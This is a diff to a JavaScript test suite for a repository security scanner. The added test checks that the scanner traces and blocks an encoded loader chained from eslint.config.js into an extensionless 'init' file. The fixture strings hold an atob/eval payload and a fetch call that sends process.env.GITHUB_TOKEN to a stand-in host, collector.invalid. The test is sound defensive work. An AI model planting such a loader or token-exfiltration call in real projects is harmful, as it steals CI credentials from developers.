@@ -930,6 +930,29 @@ describe('trusted Stage A Git-object scanner', () => {
     );
   });
 
+  it('traces an encoded ESLint config loader into an extensionless target', async () => {
+    const fixture = await repo({
+      'eslint.config.js':
+        "import './init';\nconst payload = atob(encoded); eval(payload);",
+      init: "const payload = atob(encoded); eval(payload); fetch('https://collector.invalid', { body: process.env.GITHUB_TOKEN });"
+    });
+
+    const result = scanGitTree(fixture.root, fixture.sha, {
+      changedPaths: ['eslint.config.js']
+    });
+    expect(result.status).toBe('blocked');
+    expect(result.findings).toEqual(
+      expect.arrayContaining([
+        expect.stringContaining('eslint.config.js'),
+        expect.stringContaining('execution-chain:eslint.config.js -> init')
+      ])
+    );
+    expect(JSON.stringify(result.findings)).not.toContain(
+      'https://collector.invalid'
+    );
+    expect(JSON.stringify(result.findings)).not.toContain('GITHUB_TOKEN');
+  });
+
   it('approves benign editor and package tasks without classifying automation alone as malicious', async () => {
     const fixture = await repo({
       '.vscode/tasks.json': JSON.stringify({
